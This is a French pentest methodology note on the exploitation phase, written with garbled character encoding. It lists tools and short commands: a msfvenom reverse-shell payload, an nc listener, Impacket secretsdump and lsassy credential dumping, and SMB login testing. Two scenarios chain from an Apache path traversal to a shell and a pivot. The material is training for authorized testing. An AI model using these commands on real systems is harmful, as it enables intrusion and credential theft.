
## ğŸ’¥ Exploitation

---

## Introduction

La phase dâ€™<span class="concept">exploitation</span> vise Ã  transformer les informations collectÃ©es lors des phases prÃ©cÃ©dentes (scanning + enumeration) en <span class="goal">accÃ¨s initial</span> sur la cible.

Il ne sâ€™agit pas seulement de Â« faire un exploit Â», mais de :
- Identifier un vecteur dâ€™entrÃ©e
- Choisir un mode dâ€™exploitation contrÃ´lÃ©
- Obtenir un shell, un compte, ou un accÃ¨s aux donnÃ©es

Lâ€™exploit doit toujours Ãªtre adaptÃ© au <span class="concept">contexte cible</span> (ex: prod vs CTF).

---

## Objectifs

- <span class="goal">Compromettre un systÃ¨me ou un service</span>
- <span class="goal">Obtenir un shell ou des credentials</span>
- <span class="goal">Maintenir la stabilitÃ© de la cible</span>

---

## Outils & commandes

| Outil | Exemple & explication |
|-------|-----------------------|
| <span class="technology">searchsploit</span> | <span class="example">searchsploit apache 2.4.49</span> â†’ <span class="note">Recherche dâ€™exploits connus (EDB)</span> |
| <span class="technology">exploit-db.com</span> | <span class="example">Recherche en ligne</span> |
| <span class="technology">Impacket / CrackMapExec</span> | <span class="example">cme smb target --shares</span> / <span class="example">impacket-psexec</span> |
| <span class="technology">Metasploit (msfconsole)</span> | <span class="example">use exploit/windows/smb/ms17_010_eternalblue</span> |
| <span class="technology">python3 / bash exploits</span> | <span class="example">python3 exploit.py target</span> |
| <span class="technology">nmap NSE vuln</span> | <span class="example">nmap --script vuln -p 80,443 target</span> |
| <span class="technology">Chisel / Ligolo</span> | <span class="example">Pivoting vers rÃ©seaux internes</span> |
| <span class="technology">Socat</span> | <span class="example">Reverse shell controlÃ©</span> |
| <span class="technology">msfvenom</span> | <span class="example">msfvenom -p windows/meterpreter/reverse_tcp LHOST=... -f exe</span> |

---

## VÃ©rifications avant exploitation

- <span class="best-practice">Valider le pÃ©rimÃ¨tre et les cibles autorisÃ©es</span>
- <span class="best-practice">Confirmer lâ€™impact mÃ©tier potentiel</span> (ex: prod vs test)
- <span class="best-practice">Sâ€™assurer de la stabilitÃ© de la cible (pas de DoS)</span>
- <span class="best-practice">Logger les exploits tentÃ©s et leur rÃ©sultat</span>

---

## Techniques principales

| Vecteur | Exemple |
|---------|---------|
| <span class="concept">Web Exploit</span> | SQLi, XSS â†’ RCE / LFI |
| <span class="concept">RÃ©seau</span> | SMB exploit, SNMP exploit |
| <span class="concept">Local privilege exploit</span> | Kernel vuln, SUID abuse |
| <span class="concept">Credential reuse</span> | Compte AD compromis |
| <span class="concept">Password spraying / bruteforce</span> | Hydra / CrackMapExec |

---

## Bonnes pratiques

- <span class="best-practice">Toujours valider lâ€™impact mÃ©tier avant dâ€™exploiter en prod</span>
- <span class="best-practice">Limiter les risques dâ€™instabilitÃ© (DoS involontaire)</span>
- <span class="best-practice">PrÃ©fÃ©rer un shell interactif stable</span>
- <span class="mitigation">Ne jamais exÃ©cuter un exploit destructif</span>

---

## ğŸ¯ Exemple de scÃ©nario

> <span class="note">ğŸ’¥ Cible :</span> Web server Apache 2.4.49 vulnÃ©rable (path traversal)

Actions :
- <span class="technology">searchsploit apache 2.4.49</span> â†’ exploit path traversal connu
- <span class="technology">python3 exploit.py target</span> â†’ accÃ¨s /etc/passwd en lecture
- <span class="technology">msfvenom</span> â†’ reverse shell PHP gÃ©nÃ©rÃ©
- <span class="technology">nc -lvnp 4444</span> â†’ rÃ©ception du shell
- <span class="technology">Chisel</span> â†’ pivot vers un serveur DB en interne


---

## ğŸ¯ Exemple complÃ©mentaire (SMB / AD)

> <span class="note">ğŸ’¥ Cible :</span> ContrÃ´leur de domaine exposant SMB / RPC

Actions :
- <span class="technology">cme smb target --shares</span> â†’ Ã©numÃ©ration des partages
- <span class="technology">cme smb target -u admin -p 'Summer2024!'</span> â†’ test login et accÃ¨s distant
- <span class="technology">impacket-secretsdump -target</span> â†’ extraction de hashes NTLM
- <span class="technology">lsassy</span> â†’ dump de credentials sur hÃ´te Windows
- <span class="technology">impacket-psexec</span> â†’ exÃ©cution de commande Ã  distance


---

## Liens vers escalation

- Shell â†’ <span class="goal">EnumÃ©ration pour escalade (priv esc)</span>
- Dump creds â†’ <span class="goal">Mouvement latÃ©ral (lateral movement)</span>
- Web exploit â†’ RCE â†’ pivoting possible
- SMB exploit â†’ accÃ¨s AD


---

## Exploitation offline

- <span class="best-practice">Certains pentests pros nâ€™autorisent pas dâ€™accÃ¨s Internet depuis la cible</span>
- PrÃ©voir des <span class="technology">payloads offline</span> (reverse shell restreint, msfvenom en local)
- Utiliser un <span class="technology">pivot</span> pour acheminer les flux (Chisel, socks4 proxychains)


---

## Cheatlist outils par vecteur

| Vecteur | Outils clÃ©s |
|---------|------------|
| Web Exploit | searchsploit, exploit-db, Metasploit, python exploit |
| RÃ©seau (SMB, RDP) | CrackMapExec, Impacket, Metasploit |
| AD Internal | CrackMapExec, Impacket, BloodHound |
| Local kernel / SUID | LinPEAS, winPEAS, searchsploit |
| Pivot | Chisel, Ligolo, Proxychains |
| Reverse shell | msfvenom, socat, nc |

---

## ğŸš€ Navigation

- ğŸš€ [[06_Privilege_Escalation]]
- ğŸš€ [[07_Post_Exploitation]]
